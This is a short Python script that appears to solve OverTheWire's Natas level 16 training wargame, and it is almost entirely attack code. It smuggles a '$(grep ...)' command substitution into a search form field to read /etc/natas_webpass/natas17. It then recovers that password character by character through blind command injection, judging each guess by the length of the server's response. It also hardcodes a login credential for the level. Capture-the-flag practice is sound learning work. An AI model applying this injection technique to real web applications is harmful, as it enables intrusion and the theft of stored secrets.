import requests

def flag(url,username,password):
    print("Extracting flag: ")
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit() 
    alpha_num = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    len_alphanum = len(alpha_num)
    letter = 0
    flag = ""
    while letter < len_alphanum:
        post_data = {
                "needle":"$(grep ^" + flag + alpha_num[letter] + " /etc/natas_webpass/natas17)",
                "submit":"Search"
                }
        content = requests.post(url,auth=(username,password),data=post_data)
        if len(content.text) == 461926:
            letter += 1
        else:
            flag = flag + alpha_num[letter]
            print(flag)
            letter = 0
    print("The flag for natas16 is: " + flag)

if __name__=="__main__":
    url = "http://natas16.natas.labs.overthewire.org/"
    username = "natas16"
    password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
    flag(url,username,password)